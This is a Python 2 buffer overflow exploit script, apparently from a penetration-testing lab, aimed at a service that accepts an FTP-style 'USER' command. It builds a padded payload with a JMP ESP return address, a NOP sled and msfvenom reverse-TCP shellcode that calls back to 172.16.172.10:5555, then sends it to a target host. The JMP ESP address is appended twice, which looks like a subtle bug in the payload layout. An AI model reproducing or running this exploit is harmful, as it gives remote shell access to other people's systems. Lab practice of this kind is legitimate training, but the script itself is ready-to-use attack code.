#!/usr/bin/env python2

import socket
import sys
import logging

# Offset calculated with mona pattern_create and mona pattern_offset
offset=230

# Sequence of characters to find bad characters
bad_chars="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0b\x0c\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

# address of jmp esp 
# mona modules
# mona find -s "\xFF\xE4" -m USER32.dll
jmp_esp="\xcc\x59\xfb\x77"

# NOP
nop="\x90"*20

# shellcode created with
# msfvenom -p windows/shell_reverse_tcp  LHOST=172.16.172.10 LPORT=5555 -f python  -b '\x00\x0d\x0a' -v shellcode
shellcode =  b""
shellcode += b"\xd9\xe5\xd9\x74\x24\xf4\xb8\xcc\x6d\xb9\x91"
shellcode += b"\x5f\x29\xc9\xb1\x52\x31\x47\x17\x83\xef\xfc"
shellcode += b"\x03\x8b\x7e\x5b\x64\xef\x69\x19\x87\x0f\x6a"
shellcode += b"\x7e\x01\xea\x5b\xbe\x75\x7f\xcb\x0e\xfd\x2d"
shellcode += b"\xe0\xe5\x53\xc5\x73\x8b\x7b\xea\x34\x26\x5a"
shellcode += b"\xc5\xc5\x1b\x9e\x44\x46\x66\xf3\xa6\x77\xa9"
shellcode += b"\x06\xa7\xb0\xd4\xeb\xf5\x69\x92\x5e\xe9\x1e"
shellcode += b"\xee\x62\x82\x6d\xfe\xe2\x77\x25\x01\xc2\x26"
shellcode += b"\x3d\x58\xc4\xc9\x92\xd0\x4d\xd1\xf7\xdd\x04"
shellcode += b"\x6a\xc3\xaa\x96\xba\x1d\x52\x34\x83\x91\xa1"
shellcode += b"\x44\xc4\x16\x5a\x33\x3c\x65\xe7\x44\xfb\x17"
shellcode += b"\x33\xc0\x1f\xbf\xb0\x72\xfb\x41\x14\xe4\x88"
shellcode += b"\x4e\xd1\x62\xd6\x52\xe4\xa7\x6d\x6e\x6d\x46"
shellcode += b"\xa1\xe6\x35\x6d\x65\xa2\xee\x0c\x3c\x0e\x40"
shellcode += b"\x30\x5e\xf1\x3d\x94\x15\x1c\x29\xa5\x74\x49"
shellcode += b"\x9e\x84\x86\x89\x88\x9f\xf5\xbb\x17\x34\x91"
shellcode += b"\xf7\xd0\x92\x66\xf7\xca\x63\xf8\x06\xf5\x93"
shellcode += b"\xd1\xcc\xa1\xc3\x49\xe4\xc9\x8f\x89\x09\x1c"
shellcode += b"\x1f\xd9\xa5\xcf\xe0\x89\x05\xa0\x88\xc3\x89"
shellcode += b"\x9f\xa9\xec\x43\x88\x40\x17\x04\x1b\x84\xbb"
shellcode += b"\xde\x0b\xa7\xc3\xcb\x78\x2e\x25\x99\x6e\x67"
shellcode += b"\xfe\x36\x16\x22\x74\xa6\xd7\xf8\xf1\xe8\x5c"
shellcode += b"\x0f\x06\xa6\x94\x7a\x14\x5f\x55\x31\x46\xf6"
shellcode += b"\x6a\xef\xee\x94\xf9\x74\xee\xd3\xe1\x22\xb9"
shellcode += b"\xb4\xd4\x3a\x2f\x29\x4e\x95\x4d\xb0\x16\xde"
shellcode += b"\xd5\x6f\xeb\xe1\xd4\xe2\x57\xc6\xc6\x3a\x57"
shellcode += b"\x42\xb2\x92\x0e\x1c\x6c\x55\xf9\xee\xc6\x0f"
shellcode += b"\x56\xb9\x8e\xd6\x94\x7a\xc8\xd6\xf0\x0c\x34"
shellcode += b"\x66\xad\x48\x4b\x47\x39\x5d\x34\xb5\xd9\xa2"
shellcode += b"\xef\x7d\xe9\xe8\xad\xd4\x62\xb5\x24\x65\xef"
shellcode += b"\x46\x93\xaa\x16\xc5\x11\x53\xed\xd5\x50\x56"
shellcode += b"\xa9\x51\x89\x2a\xa2\x37\xad\x99\xc3\x1d"

# Now compose the payload
buf = "USER "

# Otherwise fill the buffer with junk until reaching the overflow
buf +="A"*offset

# Test offset size 
#buf += "BBBB"
buf += jmp_esp

# Testing charsize
#buf += bad_chars 
buf += jmp_esp
buf += nop
buf += shellcode
# Finally linefeed to send the buffer
buf += '\r\n'

if len(sys.argv) != 3:
    logging.error("usage: " + sys.argv[0] + " ip port")
    sys.exit(-1)

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    s.connect((sys.argv[1], int(sys.argv[2])))
except socket.error as msg:
    logging.error("couldn't connect with target (%s)" % msg)
    sys.exit(1)

s.send(buf)
